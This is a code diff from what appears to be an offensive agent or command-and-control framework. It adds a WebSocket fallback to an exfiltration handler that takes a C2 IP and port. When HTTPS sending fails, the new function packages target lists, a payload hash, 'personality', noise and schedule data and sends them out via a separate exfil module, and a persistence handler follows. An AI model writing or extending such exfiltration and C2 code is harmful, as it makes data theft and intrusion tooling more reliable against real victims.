@@ -43,7 +43,29 @@ def _handle_exfil(action_obj, mutation, c2_ip, c2_port):
         else:
             return {"success": False, "detected": False, "channel": "HTTPS", "latency_ms": 0.0, "error": f"HTTP {resp.status_code}"}
     except Exception as e:
-        return {"success": False, "detected": False, "channel": "HTTPS", "latency_ms": 0.0, "error": str(e)}
+        # HTTPS failed — fall back to WebSocket
+        print(f"[!] HTTPS failed ({e}) — trying WS fallback")
+        return _handle_exfil_ws(action_obj, mutation, c2_ip, c2_port)
+
+def _handle_exfil_ws(action_obj, mutation, c2_ip, c2_port):
+    import uuid, os, sys
+    sys.path.insert(0, str(Path(__file__).parent))
+    from core.exfil_ws import send_via_ws
+    targets = action_obj.get("targets", [])
+    agent_id = os.environ.get("ZDS_AGENT_ID", str(uuid.uuid4())[:8])
+    data_blob = {
+        "targets": targets,
+        "payload_hash": mutation.payload_hash,
+        "personality": mutation.personality.value,
+        "noise": action_obj.get("noise"),
+        "schedule": action_obj.get("schedule"),
+    }
+    try:
+        success = send_via_ws(agent_id, data_blob)
+        return {"success": success, "detected": False, "channel": "WS", "latency_ms": 80.0}
+    except Exception as e:
+        return {"success": False, "detected": False, "channel": "WS", "latency_ms": 0.0, "error": str(e)}
+
 
 def _handle_persist(action_obj, mutation):
     try:
